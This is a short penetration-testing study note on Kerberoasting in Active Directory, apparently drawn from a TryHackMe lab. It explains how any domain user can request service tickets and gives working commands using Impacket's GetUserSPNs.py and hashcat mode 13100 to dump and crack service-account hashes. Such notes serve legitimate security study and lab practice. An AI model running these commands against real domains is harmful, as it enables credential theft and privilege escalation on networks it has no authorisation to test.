---
tags: [active-directory, credentials]
tools: [impacket, hashcat]
ports: [88]
os: [windows]
phase: [credential-access, privesc]
---
# AD - Kerberoasting

**TL;DR:** Any **domain user** can request a service ticket (TGS) for any account with an SPN; the ticket is encrypted with the service account's password hash → crack offline. Service accounts often have weak, non-expiring passwords. Hash type hashcat **13100**.

from: TryHackMe Attacktive Directory — verified vs Impacket docs

## When to use

You have **any** valid domain credential and want to escalate — service accounts are frequently high-privilege.

## How

```bash
# Dump TGS hashes for all SPN accounts
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash <WORDLIST>
```

## Gotchas

- Needs valid creds (unlike [[AD - AS-REP roasting]]).
- Clock skew > 5 min breaks Kerberos — sync with `ntpdate <DC-IP>` / `rdate`.

## Related

- [[AD - AS-REP roasting]], [[AD - DCSync]]
- [[Passwords]]
